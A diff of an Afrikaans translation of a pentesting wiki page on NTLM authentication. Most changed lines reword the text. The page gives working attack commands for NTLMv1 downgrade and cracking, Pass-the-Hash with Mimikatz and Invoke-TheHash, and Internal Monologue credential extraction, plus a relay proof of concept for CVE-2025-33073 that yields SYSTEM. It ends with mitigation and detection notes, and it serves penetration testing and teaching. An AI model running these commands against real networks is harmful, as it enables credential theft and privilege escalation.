@@ -5,7 +5,7 @@
 
 ## Basiese Inligting
 
-In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager) hashes gebruik, alhoewel dit algemeen erken word dat hierdie maklik gekompromitteer kan word. 'n Spesifieke LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie, wat die hash vir 'n leë string verteenwoordig.
+In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager) hashes gebruik, alhoewel dit algemeen erken word dat hierdie maklik gekompromitteer kan word. 'n Bepaalde LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie, wat die hash vir 'n leë string verteenwoordig.
 
 Standaard is die **Kerberos** verifikasieprotokol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree in onder spesifieke omstandighede in: afwesigheid van Active Directory, nie-bestaande domein, wanfunksionering van Kerberos weens onvanpaste konfigurasie, of wanneer verbindings probeer word met 'n IP-adres eerder as 'n geldige hostname.
 
@@ -16,8 +16,8 @@ Ondersteuning vir die verifikasieprotokolle - LM, NTLMv1, en NTLMv2 - word gefas
 **Belangrike Punten**:
 
 - LM hashes is kwesbaar en 'n leë LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui op sy nie-gebruik.
-- Kerberos is die standaard verifikasie metode, met NTLM slegs gebruik onder sekere toestande.
-- NTLM verifikasie pakkette is identifiseerbaar deur die "NTLMSSP" kop.
+- Kerberos is die standaard verifikasiemetode, met NTLM wat slegs onder sekere toestande gebruik word.
+- NTLM verifikasiepakkette is identifiseerbaar deur die "NTLMSSP" kop.
 - LM, NTLMv1, en NTLMv2 protokolle word deur die stelsel lêer `msv1\_0.dll` ondersteun.
 
 ## LM, NTLMv1 en NTLMv2
@@ -47,18 +47,18 @@ Mogelijke waardes:
 ```
 ## Basiese NTLM Domein verifikasie Skema
 
-1. Die **gebruiker** voer sy **bewyse** in
+1. Die **gebruiker** voer sy **akkrediteer** in
 2. Die kliënt masjien **stuur 'n verifikasie versoek** wat die **domeinnaam** en die **gebruikersnaam** stuur
 3. Die **bediener** stuur die **uitdaging**
 4. Die **kliënt enkripteer** die **uitdaging** met die hash van die wagwoord as sleutel en stuur dit as antwoord
-5. Die **bediener stuur** na die **Domeinbeheerder** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord**. As daar **nie** 'n Aktiewe Gids geconfigureer is of die domeinnaam die naam van die bediener is, word die bewese **lokaal nagegaan**.
+5. Die **bediener stuur** na die **Domeinbeheerder** die **domeinnaam, die gebruikersnaam, die uitdaging en die antwoord**. As daar **nie** 'n Aktiewe Gids geconfigureer is of die domeinnaam die naam van die bediener is, word die akkrediteer **lokaal nagegaan**.
 6. Die **domeinbeheerder kyk of alles korrek is** en stuur die inligting na die bediener
 
 Die **bediener** en die **Domeinbeheerder** kan 'n **Veilige Kanaal** skep via **Netlogon** bediener aangesien die Domeinbeheerder die wagwoord van die bediener ken (dit is binne die **NTDS.DIT** db).
 
-### Plaaslike NTLM verifikasie Skema
+### Lokale NTLM verifikasie Skema
 
-Die verifikasie is soos die een genoem **voorheen maar** die **bediener** ken die **hash van die gebruiker** wat probeer om binne die **SAM** lêer te verifieer. So, in plaas daarvan om die Domeinbeheerder te vra, sal die **bediener self nagaan** of die gebruiker kan verifieer.
+Die verifikasie is soos die een genoem **voorheen maar** die **bediener** ken die **hash van die gebruiker** wat probeer om binne die **SAM** lêer te verifieer. So, in plaas daarvan om die Domeinbeheerder te vra, sal die **bediener self kyk** of die gebruiker kan verifieer.
 
 ### NTLMv1 Uitdaging
 
@@ -71,18 +71,18 @@ Die **hash NT (16bytes)** is verdeel in **3 dele van 7bytes elk** (7B + 7B + (2B
 - Gebrek aan **ewekansigheid**
 - Die 3 dele kan **afsonderlik aangeval** word om die NT hash te vind
 - **DES is kraakbaar**
-- Die 3º sleutel bestaan altyd uit **5 nulles**.
-- Gegewe die **dieselfde uitdaging** sal die **antwoord** **dieselfde** wees. So, jy kan as 'n **uitdaging** aan die slagoffer die string "**1122334455667788**" gee en die antwoord aanval met **voorgekalkuleerde reënboogtafels**.
+- Die 3º sleutel is altyd saamgestel uit **5 nulles**.
+- Gegewe die **dieselfde uitdaging** sal die **antwoord** **dieselfde** wees. So, jy kan as 'n **uitdaging** aan die slagoffer die string "**1122334455667788**" gee en die antwoord aanval met **voorgerekende reënboogtafels**.
 
 ### NTLMv1 aanval
 
-Tans word dit al minder algemeen om omgewings met Onbeperkte Afvaardiging geconfigureer te vind, maar dit beteken nie jy kan nie **'n Druk Spooler diens** wat geconfigureer is, **misbruik** nie.
+Tans word dit al minder algemeen om omgewings met Onbeperkte Delegasie geconfigureer te vind, maar dit beteken nie dat jy nie 'n **Druk Spooler diens** wat geconfigureer is kan **misbruik** nie.
 
-Jy kan sommige bewese/sessies wat jy reeds op die AD het, misbruik om die **drukker te vra om te verifieer** teen 'n **gasheer onder jou beheer**. Dan, met behulp van `metasploit auxiliary/server/capture/smb` of `responder` kan jy die **verifikasie uitdaging stel na 1122334455667788**, die verifikasie poging vasvang, en as dit gedoen is met **NTLMv1** sal jy in staat wees om dit te **kraak**.\
-As jy `responder` gebruik, kan jy probeer om die vlag `--lm` te **gebruik** om te probeer om die **verifikasie** te **verlaag**.\
-_Nota dat vir hierdie tegniek die verifikasie moet gedoen word met NTLMv1 (NTLMv2 is nie geldig nie)._
+Jy kan sommige akkrediteer/sessies wat jy reeds op die AD het misbruik om die **drukker te vra om te verifieer** teen 'n **gasheer onder jou beheer**. Dan, met behulp van `metasploit auxiliary/server/capture/smb` of `responder` kan jy die **verifikasie uitdaging stel op 1122334455667788**, die verifikasie poging vang, en as dit gedoen is met **NTLMv1** sal jy in staat wees om dit te **kraak**.\
+As jy `responder` gebruik, kan jy probeer om die vlag `--lm` te gebruik om te probeer om die **verifikasie** te **verlaag**.\
+_Noot dat vir hierdie tegniek die verifikasie moet uitgevoer word met NTLMv1 (NTLMv2 is nie geldig nie)._
 
-Onthou dat die drukker die rekenaarrekening tydens die verifikasie sal gebruik, en rekenaarrekeninge gebruik **lange en ewekansige wagwoorde** wat jy **waarskynlik nie sal kan kraak** met algemene **woordeboeke**. Maar die **NTLMv1** verifikasie **gebruik DES** ([meer inligting hier](#ntlmv1-challenge)), so deur sommige dienste wat spesiaal toegewy is aan die kraak van DES, sal jy in staat wees om dit te kraak (jy kan [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) byvoorbeeld gebruik).
+Onthou dat die drukker die rekenaarrekening tydens die verifikasie sal gebruik, en rekenaarrekeninge gebruik **lange en ewekansige wagwoorde** wat jy **waarskynlik nie sal kan kraak** met algemene **woordeboeke**. Maar die **NTLMv1** verifikasie **gebruik DES** ([meer inligting hier](#ntlmv1-challenge)), so deur sommige dienste wat spesiaal toegewy is aan die kraak van DES sal jy in staat wees om dit te kraak (jy kan [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) byvoorbeeld gebruik).
 
 ### NTLMv1 aanval met hashcat
 
@@ -127,7 +127,7 @@ Voer hashcat uit (verspreid is die beste deur 'n hulpmiddel soos hashtopolis) aa
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-In hierdie geval weet ons die wagwoord hiervoor is wagwoord, so ons gaan bedrieg vir demonstrasiedoeleindes:
+In hierdie geval weet ons die wagwoord hiervoor is wagwoord, so ons gaan vals speel vir demonstrasiedoeleindes:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -169,7 +169,7 @@ As jy 'n **pcap het wat 'n suksesvolle outentikasieproses vasgevang het**, kan j
 **Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om **te verteenwoordig**.\
 Jy moet 'n **instrument** gebruik wat die **NTLM outentikasie** met daardie **hash** sal **uitvoer** of jy kan 'n nuwe **sessielogin** skep en daardie **hash** binne die **LSASS** **inspuit**, sodat wanneer enige **NTLM outentikasie uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.
 
-**Asseblief, onthou dat jy ook Pass-the-Hash-aanvalle kan uitvoer met rekenaarrekeninge.**
+**Asseblief, onthou dat jy ook Pass-the-Hash aanvalle kan uitvoer met rekenaarrekeninge.**
 
 ### **Mimikatz**
 
@@ -177,7 +177,7 @@ Jy moet 'n **instrument** gebruik wat die **NTLM outentikasie** met daardie **ha
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Dit sal 'n proses begin wat behoort aan die gebruikers wat mimikatz geloods het, maar intern in LSASS is die gestoor geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang tot netwerkbronne verkry asof jy daardie gebruiker was (soortgelyk aan die `runas /netonly` truuk, maar jy hoef nie die platte teks wagwoord te ken nie).
+Dit sal 'n proses begin wat behoort aan die gebruikers wat mimikatz geloods het, maar intern in LSASS is die gestoor geloofsbriewe diegene binne die mimikatz parameters. Dan kan jy toegang tot netwerkbronne verkry asof jy daardie gebruiker is (soortgelyk aan die `runas /netonly` truuk, maar jy hoef nie die platte teks wagwoord te ken nie).
 
 ### Pass-the-Hash van linux
 
@@ -215,7 +215,7 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsluit** sommige en **kies** die **opsie** wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enige** van **SMBExec** en **WMIExec** kies, maar jy **gee nie** enige _**Command**_ parameter nie, sal dit net **kontroleer** of jy **genoeg regte** het.
+Hierdie funksie is 'n **mengsel van al die ander**. Jy kan **verskeie gasheer** deurgee, **uitsluit** sommige en die **opsie** kies wat jy wil gebruik (_SMBExec, WMIExec, SMBClient, SMBEnum_). As jy **enige** van **SMBExec** en **WMIExec** kies, maar jy **gee nie** enige _**Command**_ parameter nie, sal dit net **kontroleer** of jy **genoeg regte** het.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
@@ -243,7 +243,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 Die Interne Monoloog-aanval is 'n stil geloofsbrief-uittreksel tegniek wat 'n aanvaller in staat stel om NTLM-hashes van 'n slagoffer se masjien te onttrek **sonder om direk met die LSASS-proses te kommunikeer**. Anders as Mimikatz, wat hashes direk uit geheue lees en dikwels deur eindpunt-sekuriteitsoplossings of Credential Guard geblokkeer word, maak hierdie aanval gebruik van **lokale oproepe na die NTLM-authentikasiepakket (MSV1_0) via die Security Support Provider Interface (SSPI)**. Die aanvaller **verlaag eers die NTLM-instellings** (bv. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) om te verseker dat NetNTLMv1 toegelaat word. Hulle doen dan asof hulle bestaande gebruikers tokens is wat verkry is uit lopende prosesse en aktiveer NTLM-authentikasie plaaslik om NetNTLMv1-antwoorde te genereer met behulp van 'n bekende uitdaging.
 
-Nadat hierdie NetNTLMv1-antwoorde vasgevang is, kan die aanvaller vinnig die oorspronklike NTLM-hashes herstel met behulp van **voorgerekende reënboogtafels**, wat verdere Pass-the-Hash-aanvalle vir laterale beweging moontlik maak. Belangrik is dat die Interne Monoloog-aanval stil bly omdat dit nie netwerkverkeer genereer, kode inspuit of direkte geheue-dumps aktiveer nie, wat dit moeiliker maak vir verdedigers om te ontdek in vergelyking met tradisionele metodes soos Mimikatz.
+Nadat hierdie NetNTLMv1-antwoorde vasgevang is, kan die aanvaller vinnig die oorspronklike NTLM-hashes herstel met behulp van **voorgerekende reënboogtafels**, wat verdere Pass-the-Hash-aanvalle vir laterale beweging moontlik maak. Belangrik is dat die Interne Monoloog-aanval stil bly omdat dit nie netwerkverkeer genereer, kode inspuit of direkte geheue-dumps aktiveer nie, wat dit moeiliker maak vir verdedigers om te detecteer in vergelyking met tradisionele metodes soos Mimikatz.
 
 As NetNTLMv1 nie aanvaar word nie—vanweë afgedwonge sekuriteitsbeleide, kan die aanvaller dalk nie 'n NetNTLMv1-antwoord verkry nie.
 
@@ -254,6 +254,7 @@ Die PoC kan gevind word in **[https://github.com/eladshamir/Internal-Monologue](
 ## NTLM Relay en Responder
 
 **Lees 'n meer gedetailleerde gids oor hoe om hierdie aanvalle hier uit te voer:**
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
@@ -267,18 +268,18 @@ Die PoC kan gevind word in **[https://github.com/eladshamir/Internal-Monologue](
 
 Windows bevat verskeie versagings wat probeer om *refleksie* aanvalle te voorkom waar 'n NTLM (of Kerberos) authentikasie wat van 'n gasheer afkomstig is, teruggestuur word na die **dieselfde** gasheer om SYSTEM-regte te verkry.
 
-Microsoft het die meeste openbare kettings gebroke met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en later patches, egter **CVE-2025-33073** toon dat die beskermings steeds omseil kan word deur te misbruik hoe die **SMB-klient diens-prinsipale name (SPNs)** wat *gemarshalled* (geserialiseerde) teiken-inligting bevat, afknot.
+Microsoft het die meeste openbare kettings gebroke met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en latere patches, egter **CVE-2025-33073** toon dat die beskermings steeds omseil kan word deur te misbruik hoe die **SMB-klient diens-prinsipale name (SPNs)** wat *gemarshalled* (geserialiseerde) teiken-inligting bevat, afknot.
 
 ### TL;DR van die fout
 1. 'n Aanvaller registreer 'n **DNS A-record** waarvan die etiket 'n gemarshalled SPN kodeer – bv.
 `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. Die slagoffer word gedwing om by daardie hostname te autentiseer (PetitPotam, DFSCoerce, ens.).
-3. Wanneer die SMB-klient die teiken-string `cifs/srv11UWhRCAAAAA…` aan `lsasrv!LsapCheckMarshalledTargetInfo` oorhandig, verwyder die oproep na `CredUnmarshalTargetInfo` die geserialiseerde blob, wat **`cifs/srv1`** laat.
-4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos ekwivalent) beskou nou die teiken as *localhost* omdat die kort gasheerdeel ooreenstem met die rekenaarnaam (`SRV1`).
+2. Die slagoffer word gedwing om aan daardie hostname te autentiseer (PetitPotam, DFSCoerce, ens.).
+3. Wanneer die SMB-klient die teikenstring `cifs/srv11UWhRCAAAAA…` aan `lsasrv!LsapCheckMarshalledTargetInfo` oorhandig, verwyder die oproep na `CredUnmarshalTargetInfo` die geserialiseerde blob, wat **`cifs/srv1`** laat.
+4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos ekwivalent) beskou nou die teiken as *localhost* omdat die kort gasheerdeel met die rekenaarnaam (`SRV1`) ooreenstem.
 5. Gevolglik stel die bediener `NTLMSSP_NEGOTIATE_LOCAL_CALL` in en inspuit **LSASS se SYSTEM-toegang-token** in die konteks (vir Kerberos word 'n SYSTEM-gemerk subsessie-sleutel geskep).
 6. Die oordrag van daardie authentikasie met `ntlmrelayx.py` **of** `krbrelayx.py` gee volle SYSTEM-regte op dieselfde gasheer.
 
-### Vinnige PoC
+### Vinige PoC
 ```bash
 # Add malicious DNS record
 dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
@@ -296,12 +297,12 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
 ### Patch & Mitigations
-* KB-patch vir **CVE-2025-33073** voeg 'n kontrole by in `mrxsmb.sys::SmbCeCreateSrvCall` wat enige SMB-verbinding blokkeer waarvan die teiken gemarshalled inligting bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
+* KB-patch vir **CVE-2025-33073** voeg 'n kontrole by in `mrxsmb.sys::SmbCeCreateSrvCall` wat enige SMB-verbinding blokkeer waarvan die teiken gemarshalleerde inligting bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Handhaaf **SMB-handtekening** om refleksie te voorkom, selfs op nie-gepatchte gasheer.
 * Monitor DNS-rekords wat lyk soos `*<base64>...*` en blokkeer dwingingsvektore (PetitPotam, DFSCoerce, AuthIP...).
 
 ### Detection ideas
-* Netwerkopnames met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar kliënt IP ≠ bediener IP.
+* Netwerkvangste met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar kliënt IP ≠ bediener IP.
 * Kerberos AP-REQ wat 'n subsessie-sleutel bevat en 'n kliënt-prinsipaal gelyk aan die gasheernaam.
 * Windows Event 4624/4648 SISTEEM-aanmeldings wat onmiddellik gevolg word deur afstand SMB-skrywe vanaf dieselfde gasheer.
 
